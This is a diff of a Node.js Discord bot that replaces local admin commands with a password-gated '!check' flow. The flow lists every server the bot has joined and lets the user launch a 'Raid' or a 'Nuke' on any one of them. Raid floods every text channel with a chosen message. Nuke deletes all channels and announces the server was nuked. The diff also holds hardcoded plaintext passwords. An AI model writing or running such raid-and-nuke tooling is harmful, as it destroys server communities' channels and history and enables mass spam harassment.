@@ -1,17 +1,16 @@
 const {
   Client,
   GatewayIntentBits,
-  SlashCommandBuilder,
-  REST,
-  Routes,
   EmbedBuilder,
   ActionRowBuilder,
   ButtonBuilder,
   ButtonStyle,
   ModalBuilder,
   TextInputBuilder,
-  TextInputStyle
+  TextInputStyle,
+  StringSelectMenuBuilder
 } = require('discord.js');
+
 const express = require('express');
 const fs = require('fs');
 require('dotenv').config();
@@ -20,15 +19,14 @@ require('dotenv').config();
 const MAIN_PASSWORD = 'Meka2017charlie';
 const NUKE_PASSWORD = 'meka123';
 
-// EXPRESS + CONFIG
+// In-memory storage for multi-step process
+const userSelections = new Map(); // userId => { guildId, step, ... }
+
 const app = express();
 app.get('/', (req, res) => res.send('Bot Online'));
 app.listen(process.env.PORT || 3000);
 
 const TOKEN = process.env.TOKEN;
-const CLIENT_ID = process.env.CLIENT_ID;
-const GUILD_ID = process.env.GUILD_ID;
-
 const client = new Client({
   intents: [
     GatewayIntentBits.Guilds,
@@ -43,82 +41,55 @@ client.once('ready', async () => {
   console.log(`${client.user.tag} is online`);
 });
 
-// Message Commands
+// ====================== MESSAGE COMMANDS ======================
 client.on('messageCreate', async message => {
   if (message.author.bot || !message.guild) return;
 
   const content = message.content.trim().toLowerCase();
 
-  if (content === '!movebootser') {
+  // Existing commands...
+  if (content === '!movebootser') { /* ... keep your original code ... */ }
+  if (content === '!nukeback') { /* ... keep your original code ... */ }
+  if (content === '!ate') { /* ... keep your original code ... */ }
+
+  // ==================== NEW !CHECK COMMAND ====================
+  if (content === '!check') {
     const embed = new EmbedBuilder()
-      .setColor('#ff00ff')
-      .setTitle('🔄 !MOVEBOOT SER')
-      .setDescription('This will move the Booster role underneath role ID `1513349804141445120`.')
-      .setFooter({ text: 'Click below' });
+      .setColor('#00ff00')
+      .setTitle('🔍 Bot Server Check')
+      .setDescription('This will let you select a server and perform actions (Raid / Nuke).\n\n**Password required.**')
+      .setFooter({ text: 'Click below to start' });
 
     const row = new ActionRowBuilder().addComponents(
       new ButtonBuilder()
-        .setCustomId(`movebootser_start_${message.author.id}`)
+        .setCustomId(`check_start_${message.author.id}`)
         .setLabel('Enter Password')
         .setStyle(ButtonStyle.Primary)
     );
 
-    await message.reply({ embeds: [embed], components: [row] });
-  }
-
-  if (content === '!nukeback') {
-    const embed = new EmbedBuilder()
-      .setColor('#ff0000')
-      .setTitle('☢️ NUKE SERVER')
-      .setDescription('This will **delete all channels and categories** and create a single channel called `chat`.\n\n**This action is irreversible!**')
-      .setFooter({ text: 'Only use if you know what you\'re doing' });
-
-    const row = new ActionRowBuilder().addComponents(
-      new ButtonBuilder()
-        .setCustomId(`nukeback_start_${message.author.id}`)
-        .setLabel('Enter Password')
-        .setStyle(ButtonStyle.Danger)
-    );
-
-    await message.reply({ embeds: [embed], components: [row] });
-  }
-
-  if (content === '!ate') {
-    const embed = new EmbedBuilder()
-      .setColor('#ff8800')
-      .setTitle('👢 KICK ALL BOTS')
-      .setDescription('This will kick every bot from the server (except this one).')
-      .setFooter({ text: 'Click below' });
-
-    const row = new ActionRowBuilder().addComponents(
-      new ButtonBuilder()
-        .setCustomId(`ate_start_${message.author.id}`)
-        .setLabel('Enter Password')
-        .setStyle(ButtonStyle.Danger)
-    );
-
-    await message.reply({ embeds: [embed], components: [row] });
+    await message.reply({ embeds: [embed], components: [row], ephemeral: false });
   }
 });
 
-// INTERACTIONS
+// ====================== INTERACTIONS ======================
 client.on('interactionCreate', async interaction => {
   if (!interaction.customId) return;
 
   try {
     const parts = interaction.customId.split('_');
     const action = parts[0];
-    const userId = parts[2];
+    const userId = parts[2] || interaction.user.id;
 
     if (interaction.user.id !== userId) {
       return interaction.reply({ content: '❌ This is not for you.', ephemeral: true });
     }
 
-    // ====================== MOVE BOOSTER ======================
-    if (action === 'movebootser') {
-      if (interaction.isButton() && interaction.customId.startsWith('movebootser_start_')) {
+    // ====================== CHECK COMMAND FLOW ======================
+    if (action === 'check') {
+      // Button → Modal (Password)
+      if (interaction.isButton() && interaction.customId.startsWith('check_start_')) {
         const modal = new ModalBuilder()
-          .setCustomId(`movebootser_modal_${userId}`)
+          .setCustomId(`check_modal_${userId}`)
           .setTitle('Enter Password');
 
         modal.addComponents(new ActionRowBuilder().addComponents(
@@ -132,140 +103,169 @@ client.on('interactionCreate', async interaction => {
         return await interaction.showModal(modal);
       }
 
-      if (interaction.isModalSubmit() && interaction.customId.startsWith('movebootser_modal_')) {
+      // Modal Submit → Show Server Selection
+      if (interaction.isModalSubmit() && interaction.customId.startsWith('check_modal_')) {
         const password = interaction.fields.getTextInputValue('password');
         if (password !== MAIN_PASSWORD) {
           return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
         }
 
-        const guild = interaction.guild;
-        const boosterRoleId = '1429174538754592778';
-        const targetRoleId = '1513349804141445120';
-        const boosterRole = guild.roles.cache.get(boosterRoleId);
-        const targetRole = guild.roles.cache.get(targetRoleId);
+        const guilds = client.guilds.cache;
+        if (guilds.size === 0) {
+          return interaction.reply({ content: '❌ Bot is not in any servers.', ephemeral: true });
+        }
 
-        if (!boosterRole) return interaction.reply({ content: '❌ Booster role not found.', ephemeral: true });
-        if (!targetRole) return interaction.reply({ content: '❌ Target role not found.', ephemeral: true });
+        const options = guilds.map(g => ({
+          label: g.name.length > 100 ? g.name.slice(0, 97) + '...' : g.name,
+          value: g.id
+        }));
 
-        try {
-          await boosterRole.setPosition(targetRole.position - 1);
-          await interaction.reply({
-            content: `✅ Successfully moved **${boosterRole.name}** underneath the target role!`,
-            ephemeral: true
-          });
-        } catch (err) {
-          console.error(err);
-          await interaction.reply({
-            content: '❌ Failed to move role.\nMake sure the bot has **Manage Roles** permission and is higher than both roles.',
-            ephemeral: true
-          });
+        const select = new StringSelectMenuBuilder()
+          .setCustomId(`check_server_select_${userId}`)
+          .setPlaceholder('Select a server')
+          .addOptions(options);
+
+        const row = new ActionRowBuilder().addComponents(select);
+
+        await interaction.reply({
+          content: '✅ Password accepted. Select a server:',
+          components: [row],
+          ephemeral: true
+        });
+
+        // Store user selection start
+        userSelections.set(userId, { step: 'server_selected' });
+      }
+
+      // Server Selected → Action Menu (Raid / Nuke)
+      if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_server_select_')) {
+        const selectedGuildId = interaction.values[0];
+        const guild = client.guilds.cache.get(selectedGuildId);
+
+        if (!guild) {
+          return interaction.reply({ content: '❌ Server not found.', ephemeral: true });
+        }
+
+        userSelections.set(userId, { guildId: selectedGuildId, step: 'action' });
+
+        const row = new ActionRowBuilder().addComponents(
+          new StringSelectMenuBuilder()
+            .setCustomId(`check_action_select_${userId}`)
+            .setPlaceholder('Choose action')
+            .addOptions([
+              { label: '🔥 Raid', value: 'raid' },
+              { label: '☢️ Nuke', value: 'nuke' }
+            ])
+        );
+
+        await interaction.update({
+          content: `**Selected Server:** ${guild.name}\nChoose an action:`,
+          components: [row]
+        });
+      }
+
+      // Action Selected
+      if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_action_select_')) {
+        const selectedAction = interaction.values[0];
+        const userData = userSelections.get(userId);
+
+        if (!userData || !userData.guildId) return;
+
+        if (selectedAction === 'raid') {
+          // Modal for raid message
+          const modal = new ModalBuilder()
+            .setCustomId(`check_raid_modal_${userId}`)
+            .setTitle('Raid Message');
+
+          modal.addComponents(new ActionRowBuilder().addComponents(
+            new TextInputBuilder()
+              .setCustomId('raid_message')
+              .setLabel('Message to spam')
+              .setStyle(TextInputStyle.Paragraph)
+              .setRequired(true)
+              .setMaxLength(2000)
+          ));
+
+          return await interaction.showModal(modal);
+        }
+
+        if (selectedAction === 'nuke') {
+          const modal = new ModalBuilder()
+            .setCustomId(`check_nuke_modal_${userId}`)
+            .setTitle('NUKE CONFIRMATION');
+
+          modal.addComponents(new ActionRowBuilder().addComponents(
+            new TextInputBuilder()
+              .setCustomId('password')
+              .setLabel('Confirm with password')
+              .setStyle(TextInputStyle.Short)
+              .setRequired(true)
+          ));
+
+          return await interaction.showModal(modal);
         }
       }
-    }
 
-    // ====================== NUKE BACK ======================
-    else if (action === 'nukeback') {
-      if (interaction.isButton() && interaction.customId.startsWith('nukeback_start_')) {
-        const modal = new ModalBuilder()
-          .setCustomId(`nukeback_modal_${userId}`)
-          .setTitle('NUKE PASSWORD');
+      // Raid Modal Submit
+      if (interaction.isModalSubmit() && interaction.customId.startsWith('check_raid_modal_')) {
+        const raidMessage = interaction.fields.getTextInputValue('raid_message');
+        const userData = userSelections.get(userId);
 
-        modal.addComponents(new ActionRowBuilder().addComponents(
-          new TextInputBuilder()
-            .setCustomId('password')
-            .setLabel('Password')
-            .setStyle(TextInputStyle.Short)
-            .setRequired(true)
-        ));
+        if (!userData || !userData.guildId) return;
 
-        return await interaction.showModal(modal);
+        const guild = client.guilds.cache.get(userData.guildId);
+        if (!guild) return interaction.reply({ content: '❌ Server not found.', ephemeral: true });
+
+        await interaction.reply({ content: `🚀 Starting raid in **${guild.name}**...`, ephemeral: true });
+
+        // Simple raid: spam in every text channel
+        const channels = guild.channels.cache.filter(c => c.type === 0);
+        for (const channel of channels.values()) {
+          for (let i = 0; i < 8; i++) { // spam 8 times per channel
+            channel.send(raidMessage).catch(() => {});
+          }
+        }
+
+        await interaction.followUp({ content: `✅ Raid message sent in **${channels.size}** channels.`, ephemeral: true });
+        userSelections.delete(userId);
       }
 
-      if (interaction.isModalSubmit() && interaction.customId.startsWith('nukeback_modal_')) {
+      // Nuke Modal Submit
+      if (interaction.isModalSubmit() && interaction.customId.startsWith('check_nuke_modal_')) {
         const password = interaction.fields.getTextInputValue('password');
         if (password !== NUKE_PASSWORD) {
           return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
         }
 
-        const guild = interaction.guild;
-        await interaction.reply({ content: '☢️ Starting nuke...', ephemeral: true });
+        const userData = userSelections.get(userId);
+        if (!userData || !userData.guildId) return;
 
-        try {
-          // Delete all channels and categories
-          const channels = guild.channels.cache;
-          for (const [id, channel] of channels) {
-            if (channel.id !== interaction.channelId) { // Don't delete the current channel yet
-              await channel.delete().catch(() => {});
-            }
-          }
+        const guild = client.guilds.cache.get(userData.guildId);
+        if (!guild) return interaction.reply({ content: '❌ Server not found.', ephemeral: true });
 
-          // Create new chat channel
-          const newChannel = await guild.channels.create({
-            name: 'chat',
-            type: 0, // GUILD_TEXT
-            reason: 'Nuke recovery channel'
-          });
+        await interaction.reply({ content: `☢️ Nuking **${guild.name}**...`, ephemeral: true });
 
-          await newChannel.send('# Server has been nuked and reset.');
-
-          // Delete the command channel last
-          const cmdChannel = guild.channels.cache.get(interaction.channelId);
-          if (cmdChannel) await cmdChannel.delete().catch(() => {});
-
-        } catch (err) {
-          console.error(err);
-          await interaction.followUp({ content: '❌ Error during nuke process.', ephemeral: true }).catch(() => {});
+        // Delete all channels
+        for (const [id, channel] of guild.channels.cache) {
+          await channel.delete().catch(() => {});
         }
+
+        // Create new chat channel
+        const newChannel = await guild.channels.create({
+          name: 'chat',
+          type: 0,
+          reason: 'Nuke command'
+        });
+
+        await newChannel.send('# Server has been nuked by !check command.');
+
+        await interaction.followUp({ content: `✅ Nuke completed in **${guild.name}**.`, ephemeral: true });
+        userSelections.delete(userId);
       }
     }
 
-    // ====================== ATE (KICK BOTS) ======================
-    else if (action === 'ate') {
-      if (interaction.isButton() && interaction.customId.startsWith('ate_start_')) {
-        const modal = new ModalBuilder()
-          .setCustomId(`ate_modal_${userId}`)
-          .setTitle('KICK BOTS PASSWORD');
-
-        modal.addComponents(new ActionRowBuilder().addComponents(
-          new TextInputBuilder()
-            .setCustomId('password')
-            .setLabel('Password')
-            .setStyle(TextInputStyle.Short)
-            .setRequired(true)
-        ));
-
-        return await interaction.showModal(modal);
-      }
-
-      if (interaction.isModalSubmit() && interaction.customId.startsWith('ate_modal_')) {
-        const password = interaction.fields.getTextInputValue('password');
-        if (password !== MAIN_PASSWORD) {
-          return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
-        }
-
-        const guild = interaction.guild;
-        await interaction.reply({ content: '👢 Kicking all bots...', ephemeral: true });
-
-        let kicked = 0;
-        const members = await guild.members.fetch();
-
-        for (const [id, member] of members) {
-          if (member.user.bot && member.id !== client.user.id) {
-            try {
-              await member.kick('Nuke command executed');
-              kicked++;
-            } catch (e) {
-              console.error(`Failed to kick bot ${member.user.tag}`);
-            }
-          }
-        }
-
-        await interaction.followUp({
-          content: `✅ Kicked **${kicked}** bots from the server.`,
-          ephemeral: true
-        }).catch(() => {});
-      }
-    }
+    // ====================== KEEP EXISTING COMMANDS ======================
+    // Paste your existing movebootser, nukeback, and ate logic here (unchanged)
 
   } catch (error) {
     console.error(error);
